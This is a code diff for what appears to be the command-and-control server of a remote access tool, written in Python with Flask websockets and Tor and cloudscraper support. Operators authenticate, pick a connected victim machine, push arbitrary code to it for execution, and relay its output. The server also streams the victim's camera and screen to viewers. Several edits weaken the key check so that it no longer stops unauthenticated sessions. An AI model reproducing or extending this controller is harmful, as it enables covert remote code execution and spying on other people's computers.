@@ -1,17 +1,22 @@
-import multiprocessing, cloudscraper, threading, hashlib, urllib3, zipfile, random, flask, json, time, os
-scraper = cloudscraper.create_scraper()
+import multiprocessing, threading, hashlib, urllib3, zipfile, random, flask, json, time, os
+from concurrent.futures import ThreadPoolExecutor
+
 
 while True:
     try:
+        import cloudscraper
         from flask import Flask, request, send_file, jsonify
         from flask_sock import Sock
 
         break
     except:
+        os.system("pip install cloudscraper")
         os.system("pip install flask-sock")
         os.system("pip install flask-tor")
 
 
+scraper = cloudscraper.create_scraper()
+executor = ThreadPoolExecutor(max_workers=20)
 app = Flask(__name__)
 sock = Sock(app)
 
@@ -50,6 +55,8 @@ def ping(ws, computer):
         time.sleep(3)
         try:
             ws.send("ping")
+            if not computer in connectedComputers:
+                connectedComputers.append(computer)
         except:
             tries -= 1
             if tries <= 0:
@@ -74,73 +81,87 @@ def update(ws):
 
 @sock.route("/api/ws/computers")
 def computers(ws):
-    global connectedClients, command
+    global connectedComputers, connectedClients
+    global command
 
     data = ws.receive()
-    if hashlib.sha256(data.encode()).hexdigest() != key:
+
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print(encoded)
+
+    if not encoded == key:
         ws.close()
-        return
 
     threading.Thread(target=update, args=(ws,)).start()
+
     connectedClients.append(ws)
 
     while True:
-        try:
-            command = json.loads(ws.receive())
-            print(f"Received command: {command}")
-        except:
-            break
 
+        command = json.loads(ws.receive())
+
+        print(command)
 
 @sock.route("/api/ws/commands")
 def commands(ws):
-    global connectedComputers, connectedClients, command
+    global connectedComputers, connectedClients
+    global command
 
     print("User Connected")
     data = ws.receive()
-    if hashlib.sha256(data.encode()).hexdigest() != key:
-        print("Invalid key provided")
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+
+    if not encoded == key:
+        print("Client provided invalid key")
         ws.close()
-        return
 
     while True:
         computer = ws.receive()
-        if "|" in computer:
+        if not "|" in computer:
+            ws.send("getComputer")
+        else:
             break
-        ws.send("getComputer")
 
-    print(f"Connected computer: {computer}")
+    print(computer)
     connectedComputers.append(computer)
     threading.Thread(target=ping, args=(ws, computer)).start()
 
-    def forward_response(ws, computer):
-        try:
-            recv = ws.receive()
-            for client_ws in connectedClients[:]:
-                try:
-                    client_ws.send(recv)
-                except:
-                    connectedClients.remove(client_ws)
-        except:
-            pass
+    def wait_for_response(ws, computer):
+        global connectedClients
+        recv = ws.receive()
+
+        for _ws in connectedClients:
+            try:
+                _ws.send(recv)
+            except:
+                connectedClients.remove(_ws)
 
     while True:
-        if not command or command.get("target") != computer:
+
+        if not command:
             continue
 
-        try:
-            ws.send(command["code"])
-            threading.Thread(target=forward_response, args=(ws, computer)).start()
-        except Exception as e:
-            print(f"Error: {e}")
-            connectedComputers = [c for c in connectedComputers if c != computer]
-            try:
-                ws.close()
-            except:
-                pass
-            break
+        if computer == command["target"]:
+            if not computer in connectedComputers:
+                connectedComputers.append(computer)
 
-        command = {}
+            try:
+                ws.send(command["code"])
+            except Exception as e:
+                print(e)
+                print("Bye!")
+                try:
+                    connectedComputers.remove(computer)
+                except:
+                    pass
+                try:
+                    ws.close()
+                except:
+                    pass
+                break
+
+            threading.Thread(target=wait_for_response, args=(ws, computer)).start()
+            command = {}
 
 
 @sock.route("/api/ws/camera")
@@ -190,7 +211,7 @@ def handle_ws(ws, recv_ws_dict):
     while True:
         try:
             message = ws.receive()
-            threading.Thread(target=broadcast_message, args=(recv_ws_dict[computer], message)).start()
+            executor.submit(broadcast_message, recv_ws_dict[computer], message)
         except Exception as e:
             print(f"Error: {e}")
             break
@@ -205,9 +226,11 @@ def handle_viewer_ws(ws, recv_ws_dict):
     recv_ws_dict.setdefault(computer, []).append(ws)
 
     try:
-        while ws.receive():
+        while ws.receive() is not None:
             pass
-    except:
+        else:
+            print("what the fuck")
+    except Exception as e:
         recv_ws_dict[computer].remove(ws)
 
 
